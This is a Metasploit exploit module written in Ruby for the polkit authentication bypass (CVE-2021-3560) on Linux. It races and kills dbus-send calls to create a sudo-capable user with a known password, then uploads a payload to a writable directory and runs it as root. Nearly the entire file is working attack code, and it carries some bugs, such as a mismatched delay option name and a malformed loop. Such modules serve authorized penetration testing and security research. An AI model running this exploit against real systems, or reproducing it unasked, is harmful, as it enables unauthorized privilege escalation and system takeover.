##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'unix_crypt'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Local::Linux
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Polkit Authentication Bypass',
        'Description' => %q{
          A vulnerability exists within the polkit system service that can be leveraged by a local, unprivileged
          attacker to perform privileged operations. In order to leverage the vulnerability, the attacker invokes a
          method over D-Bus and kills the client process. This will occasionally cause the operation to complete without
          being subjected to all of the necessary authentication.
          The exploit module leverages this to add a new user with a sudo access and a known password. The new account
          is then leveraged to execute a payload with root privileges.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Kevin Backhouse',                   # vulnerability discovery and analysis
            'Spencer McIntyre',                  # metasploit module
            'jheysel-r7'                         # metasploit module
          ],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Platform' => ['unix', 'linux'],
        'References' => [
          ['URL', 'https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/'],
          ['CVE', '2021-3560'],
          ['EDB', '50011'],
        ],
        'Targets' =>
          [
            [ 'Automatic', {} ],
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2021-06-03',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS, SCREEN_EFFECTS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    register_options([
      OptString.new('WRITEABLEDIR', [ true, 'A directory where you can write files.', '/tmp' ]),
      OptString.new('USERNAME', [ true, 'A username to add as root', 'msf' ], regex: /^[a-z_]([a-z0-9_-]{0,31}|[a-z0-9_-]{0,30}\$)$/),
      OptString.new('PASSWORD', [ true, 'A password to add for the user (default: random)', rand_text_alphanumeric(8)]),
      OptString.new('CMD_DELAY', [
        true, 'Amount of time in seconds to let the command to run before killing it.
This value should be half of the time it takes to run:
\"time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply
/org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:<USERNAME> string:"<USERNAME>" int32:1\"', '0.002'
      ]),
      OptString.new('ITERATIONS', [ true, 'Due to the race condition the command might have to be run multiple times before it is successful. Use this to define how many times each command is attempted', '20']),
    ])
  end

  def exploit_set_realname(new_realname)
    cmd_exec(<<~SCRIPT
      for i in {1..#{datastore['ITERATIONS']}}; do
        dbus-send
          --system
          --dest=org.freedesktop.Accounts
          --type=method_call
          --print-reply
          /org/freedesktop/Accounts/User0
          org.freedesktop.Accounts.User.SetRealName
          string:'#{new_realname}' &
        sleep 0.004s;
        kill $!;
        dbus-send
          --system
          --dest=org.freedesktop.Accounts
          --print-reply
          /org/freedesktop/Accounts/User0
          org.freedesktop.DBus.Properties.Get
          string:org.freedesktop.Accounts.User
          string:RealName
        | grep "string \\"#{new_realname}\\"";
        if [ $? -eq 0 ]; then
          echo success;
          break;
        fi;
      done
    SCRIPT
               .gsub(/\s+/, ' ')) =~ /success/
  end

  def check
    unless cmd_exec('pkexec --version') =~ /pkexec version (\d+\S*)/
      return CheckCode::Safe('The polkit framework is not installed')
    end

    # The version as returned by pkexec --version is insufficient to identify whether or not the patch is installed. To
    # do that, the distro specific package manager would need to be queried.
    status = CheckCode::Detected("Detected polkit framework version #{Regexp.last_match(1)}.")

    if !is_root? && command_exists?('dbus-send')
      # This is required to make the /org/freedesktop/Accounts/User0 object_path available.
      dbus_method_call('/org/freedesktop/Accounts', 'org.freedesktop.Accounts.FindUserByName', 'root')
      # Check for the presence of the vulnerability be exploiting it to set the root user's RealName property to a
      # random string before restoring it.
      result = dbus_method_call('/org/freedesktop/Accounts/User0', 'org.freedesktop.DBus.Properties.Get', 'org.freedesktop.Accounts.User', 'RealName')
      if result =~ /variant\s+string\s+"(.*)"/
        old_realname = Regexp.last_match(1)
        if exploit_set_realname(rand_text_alphanumeric(12))
          status = CheckCode::Vulnerable('The polkit framework instance is vulnerable.')
          unless exploit_set_realname(old_realname)
            print_error('Failed to restore the root user\'s orignal \'RealName\' property value')
          end
        end
      end
    end

    status
  end

  def dbus_method_call(object_path, interface_member, *args)
    cmd_args = %w[dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply]
    cmd_args << object_path
    cmd_args << interface_member
    args.each do |arg|
      if arg.is_a? Integer
        cmd_args << "int32:#{arg}"
      elsif arg.is_a? String
        cmd_args << "string:'#{arg}'"
      end
    end

    cmd = cmd_args.join(' ')
    vprint_status("Running: #{cmd}")
    cmd_exec(cmd)
  end

  def create_unix_crypt_hash
    UnixCrypt::SHA256.build(datastore['PASSWORD'].to_s)
  end

  def exploit_set_username
    cmd_exec(<<~SCRIPT
      for i in {1..#{datastore['ITERATIONS']}}; do
        dbus-send
          --system
          --dest=org.freedesktop.Accounts
          --type=method_call
          --print-reply
          /org/freedesktop/Accounts
          org.freedesktop.Accounts.CreateUser
          string:#{datastore['USERNAME']}#{' '}
          string:\"#{datastore['USERNAME']}\"#{' '}
          int32:1 &
        sleep #{datastore['CMDDELAY']}s;
        kill $!;
        if id #{datastore['USERNAME']}; then#{' '}
          echo \"success\";#{' '}
          break;
        fi;
      done
    SCRIPT
               .gsub(/\s+/, ' ')) =~ /success/
  end

  def exploit_set_password(uid, hashed_password)
    cmd_exec(<<~SCRIPT
      for i in {1..#{datastore['ITERATIONS']}; do
        dbus-send#{' '}
          --system
          --dest=org.freedesktop.Accounts
          --type=method_call
          --print-reply#{' '}
          /org/freedesktop/Accounts/User#{uid}#{'  '}
          org.freedesktop.Accounts.User.SetPassword#{' '}
          string:'#{hashed_password}'#{' '}
          string: &#{' '}
        sleep #{datastore['CMDDELAY']}s;
        kill $!;#{' '}
        echo #{datastore['PASSWORD']}#{' '}
        | su - #{datastore['USERNAME']}#{' '}
        -c \"echo #{datastore['PASSWORD']} | sudo -S id\"#{' '}
        | grep \"uid=0(root)\";#{' '}
        if [ $? -eq 0 ]; then#{' '}
          echo \"success\";
          break;#{' '}
        fi;
      done
    SCRIPT
               .gsub(/\s+/, ' ')) =~ /success/
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def upload_payload
    fname = "#{datastore['WRITEABLEDIR']}/#{Rex::Text.rand_text_alpha(5)}"
    upload_and_chmodx(fname, generate_payload_exe)
    return nil unless file_exist?(fname)

    fname
  end

  def execute_payload(fname)
    cmd_exec("echo #{datastore['PASSWORD']} | su - #{datastore['USERNAME']} -c \"echo #{datastore['PASSWORD']} | sudo -S #{fname}\"")
  end

  # TODO: - use dbus to delete user method
  def remove_user
    print_status('Removing the user added: ')
  end

  def exploit
    print_status("Attempting to create user #{datastore['USERNAME']}")
    if exploit_set_username
      uid = cmd_exec("id -u #{datastore['USERNAME']}")
      print_good("User #{datastore['USERNAME']} created with UID #{uid}")
      print_status("Attempting to set the password of the newly create user, #{datastore['USERNAME']}, to: #{datastore['PASSWORD']}")
      if exploit_set_password(uid, create_unix_crypt_hash)
        print_good('Obtained code execution has root!')
        fname = upload_payload
        execute_payload(fname)
        # TODO: remove_user
        remove_user
      else
        fail_with(Failure::BadConfig, "Attempted setting the password #{datastore['Iterations']} times, did not work.")
      end
    else
      fail_with(Failure::BadConfig, "The user #{datastore['USERNAME']} was unable to be created. This could be due to race condition that the vulnerability.")
    end
  end
end
